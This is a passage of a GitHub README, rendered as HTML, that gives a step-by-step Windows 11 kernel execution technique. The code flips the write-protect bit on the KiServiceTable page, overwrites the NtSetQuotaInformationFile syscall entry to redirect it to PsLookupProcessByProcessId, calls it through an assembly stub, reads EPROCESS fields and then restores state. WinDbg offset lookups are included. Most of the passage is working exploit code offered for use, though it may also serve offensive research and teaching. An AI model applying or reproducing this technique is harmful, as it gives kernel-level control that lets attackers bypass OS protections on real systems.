+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">4. <strong>Get PDE for KiServiceTable and Flip R/W Bit</strong></h4><a id="user-content-4-get-pde-for-kiservicetable-and-flip-rw-bit" class="anchor" aria-label="Permalink: 4. Get PDE for KiServiceTable and Flip R/W Bit" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#4-get-pde-for-kiservicetable-and-flip-rw-bit"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<div class="highlight highlight-source-c++ notranslate position-relative overflow-auto" dir="auto"><pre><span class="pl-c1">DWORD64</span> ntKiServiceTable_pde_flags;
+<span class="pl-c"><span class="pl-c">//</span> Flip R/W bit (bit 1)</span>
+New_ntKiServiceTable_pde_flags = ntKiServiceTable_pde_flags ^ (<span class="pl-c1">1</span> &lt;&lt; <span class="pl-c1">1</span>);
+<span class="pl-en">WriteMemoryDWORD64</span>(ntKiServiceTable_pde, New_ntKiServiceTable_pde_flags);</pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="DWORD64 ntKiServiceTable_pde_flags;
+// Flip R/W bit (bit 1)
+New_ntKiServiceTable_pde_flags = ntKiServiceTable_pde_flags ^ (1 << 1);
+WriteMemoryDWORD64(ntKiServiceTable_pde, New_ntKiServiceTable_pde_flags);" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto">You're enabling write access to the memory page that contains the <code>KiServiceTable</code>, which is normally read-only.</p>
+<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">5. <strong>Hijack the Syscall</strong></h4><a id="user-content-5-hijack-the-syscall" class="anchor" aria-label="Permalink: 5. Hijack the Syscall" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#5-hijack-the-syscall"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<div class="highlight highlight-source-c++ notranslate position-relative overflow-auto" dir="auto"><pre>		<span class="pl-c1">DWORD64</span>	NtSetQuotaInformationFile = (<span class="pl-c1">DWORD64</span>)nt_KiServiceTable + NtSetQuotaInformationFile_syscallnumber * <span class="pl-c1">0x04</span>;
+	<span class="pl-c"><span class="pl-c">//</span> PsLookupProcessByProcessId Kernel Address</span>
+	<span class="pl-c1">DWORD64</span> PsLookupProcessByProcessId = (<span class="pl-c1">DWORD64</span>)nt_base + PsLookupProcessByProcessId_Offset_fromNT;
+  <span class="pl-c"><span class="pl-c">//</span> Calculate the offset to jump to PsLookupProcessByProcessId</span>
+	<span class="pl-c1">DWORD</span> offset = (<span class="pl-c1">DWORD</span>)(PsLookupProcessByProcessId - nt_KiServiceTable);
+	<span class="pl-c1">DWORD</span> shifted = offset &lt;&lt; <span class="pl-c1">4</span>;
+	<span class="pl-c"><span class="pl-c">//</span> Overwrite the NtSetQuotaInformationFile syscall offset in the Dispatch table with the new one</span>
+	b = <span class="pl-c1">this</span>-&gt;objMemHandler-&gt;<span class="pl-en">WriteMemoryPrimitive</span>(<span class="pl-c1">0x04</span>, NtSetQuotaInformationFile, shifted);</pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="		DWORD64	NtSetQuotaInformationFile = (DWORD64)nt_KiServiceTable + NtSetQuotaInformationFile_syscallnumber * 0x04;
+	// PsLookupProcessByProcessId Kernel Address
+	DWORD64 PsLookupProcessByProcessId = (DWORD64)nt_base + PsLookupProcessByProcessId_Offset_fromNT;
+  // Calculate the offset to jump to PsLookupProcessByProcessId
+	DWORD offset = (DWORD)(PsLookupProcessByProcessId - nt_KiServiceTable);
+	DWORD shifted = offset << 4;
+	// Overwrite the NtSetQuotaInformationFile syscall offset in the Dispatch table with the new one
+	b = this->objMemHandler->WriteMemoryPrimitive(0x04, NtSetQuotaInformationFile, shifted);" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto">You overwrite the <code>NtSetQuotaInformationFile</code> syscall pointer to jump to <code>PsLookupProcessByProcessId</code>.</p>
+<p dir="auto">You can get <code>PsLookupProcessByProcessId_Offset_fromNT</code> from windbg local kernel session.</p>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>2: kd&gt; ? nt!PsLookupProcessByProcessId - nt
+Evaluate expression: 9465504 = 00000000`00906ea0
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="2: kd> ? nt!PsLookupProcessByProcessId - nt
+Evaluate expression: 9465504 = 00000000`00906ea0" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">6. <strong>Call the Hijacked Syscall using asm</strong></h4><a id="user-content-6-call-the-hijacked-syscall-using-asm" class="anchor" aria-label="Permalink: 6. Call the Hijacked Syscall using asm" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#6-call-the-hijacked-syscall-using-asm"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<div class="highlight highlight-source-c++ notranslate position-relative overflow-auto" dir="auto"><pre><span class="pl-c1">NTSTATUS</span> status = HijackedSyscall((<span class="pl-c1">HANDLE</span>)pid, (<span class="pl-c1">DWORD64</span>)PEProcess);</pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="NTSTATUS status = HijackedSyscall((HANDLE)pid, (DWORD64)PEProcess);" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre lang="masm" class="notranslate"><code>HijackedSyscall PROC
+	mov r10, rcx
+	mov eax, syscallNumber  ; populated at runtime from ntdll!NtSetQuotaInformationFile
+	syscall
+	ret
+HijackedSyscall ENDP
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="HijackedSyscall PROC
+	mov r10, rcx
+	mov eax, syscallNumber  ; populated at runtime from ntdll!NtSetQuotaInformationFile
+	syscall
+	ret
+HijackedSyscall ENDP" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto">You call the syscall, which now executes <code>PsLookupProcessByProcessId</code> in kernel context, passing a PID and an allocated memory buffer to receive the EPROCESS pointer.</p>
+<blockquote>
+<p dir="auto">Because the stub is just the standard syscall ABI, it works for any routine arity. The C++ side casts <code>HijackedSyscall</code> to one of <code>PFN_HSC_2</code> … <code>PFN_HSC_8</code> (declared in <code>kernelHelperUtil.h</code>) to match the redirect target's signature — <code>PFN_HSC_2</code> for <code>PsLookupProcessByProcessId</code>, <code>PFN_HSC_3</code> for <code>memcpy</code>, etc.</p>
+</blockquote>
+<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">7. <strong>Read Process Name</strong></h4><a id="user-content-7-read-process-name" class="anchor" aria-label="Permalink: 7. Read Process Name" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#7-read-process-name"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<div class="highlight highlight-source-c++ notranslate position-relative overflow-auto" dir="auto"><pre>	b = <span class="pl-c1">this</span>-&gt;objMemHandler-&gt;<span class="pl-en">VirtualRead</span>(
+		(<span class="pl-c1">DWORD64</span>)KernelEprocess + imageFileNameOffset,
+		&amp;processname,
+		sizeof(processname)
+	);
+
+	<span class="pl-c"><span class="pl-c">//</span> Print the string</span>
+	<span class="pl-en">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>[&gt;] Process Name: %s<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, processname);</pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="	b = this->objMemHandler->VirtualRead(
+		(DWORD64)KernelEprocess + imageFileNameOffset,
+		&amp;processname,
+		sizeof(processname)
+	);
+
+	// Print the string
+	printf(&quot;[>] Process Name: %s\n&quot;, processname);" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto">You parse the <code>ImageFileName</code> field from the EPROCESS structure to identify the target process with our Read Primitive.</p>
+<p dir="auto">You can get the <code>ImageFileName</code> offset from windbg local kernel session.</p>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>2: kd&gt; dt _EPROCESS ImageFileName
+nt!_EPROCESS
+   +0x338 ImageFileName : [15] UChar
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="2: kd> dt _EPROCESS ImageFileName
+nt!_EPROCESS
+   +0x338 ImageFileName : [15] UChar" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">8. <strong>Cleanup</strong></h4><a id="user-content-8-cleanup" class="anchor" aria-label="Permalink: 8. Cleanup" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#8-cleanup"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">You restore:</p>
+<ul dir="auto">
+<li>The original syscall handler:
+<div class="highlight highlight-source-c++ notranslate position-relative overflow-auto" dir="auto"><pre><span class="pl-en">WriteMemoryPrimitive</span>(<span class="pl-c1">0x04</span>, NtSetQuotaInformationFile, orig_syscall_offset);</pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="WriteMemoryPrimitive(0x04, NtSetQuotaInformationFile, orig_syscall_offset);" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+</li>
+<li>Original memory protection:
+<div class="highlight highlight-source-c++ notranslate position-relative overflow-auto" dir="auto"><pre><span class="pl-en">WriteMemoryDWORD64</span>(ntKiServiceTable_pde, ntKiServiceTable_pde_flags);</pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="WriteMemoryDWORD64(ntKiServiceTable_pde, ntKiServiceTable_pde_flags);" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+</li>
+</ul>
+<hr>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">🧾 Offsets — what's dynamic vs. what you must verify</h3><a id="user-content--offsets--whats-dynamic-vs-what-you-must-verify" class="anchor" aria-label="Permalink: 🧾 Offsets — what's dynamic vs. what you must verify" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#-offsets--whats-dynamic-vs-what-you-must-verify"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 